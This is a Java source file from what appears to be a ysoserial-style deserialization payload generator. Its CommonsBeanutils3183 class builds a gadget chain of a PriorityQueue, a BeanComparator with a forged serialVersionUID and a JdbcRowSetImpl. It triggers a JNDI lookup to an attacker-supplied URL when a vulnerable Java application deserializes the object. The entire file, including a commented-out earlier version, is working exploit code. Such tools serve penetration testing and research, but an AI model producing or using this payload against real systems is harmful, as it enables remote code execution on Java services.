package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassClassPath;
import javassist.CtClass;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Reflections;
import com.h2tg.ysogate.utils.SuClassLoader;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.h2tg.ysogate.config.Config.POOL;
import static com.h2tg.ysogate.utils.CtClassUtils.insertField;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils3183 implements CommandObjectPayload<Object>
{

//	@Override
//	public Object getObject(String command) throws Exception {
//		String jndiURL = null;
//		if (command.toLowerCase().startsWith("jndi:")) {
//			jndiURL = command.substring(5);
//		}
//
//		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
//		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
//
//		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
////		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -2044202215314119608L;");
////		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
//		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
//		Reflections.setFieldValue(comparator, "property", null);
//		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
//
//		JdbcRowSetImpl rs = new JdbcRowSetImpl();
//		rs.setDataSourceName(jndiURL);
//		rs.setMatchColumn("su18");
//		PriorityQueue queue = new PriorityQueue(2, comparator);
//
//		queue.add(new BigInteger("1"));
//		queue.add(new BigInteger("1"));
//		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
//		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
//
//		ctBeanComparator.defrost();
//		return queue;
//	}
	@Override
	public Object getObject(final String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}
		JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiURL);
		jdbcRowSet.setMatchColumn("foo");
		// mock method name until armed
		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
//		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -2044202215314119608L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");

		// switch contents of queue
		Reflections.setFieldValue(queue, "queue", new Object[]{jdbcRowSet, jdbcRowSet});

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils3183.class, args);
	}
}
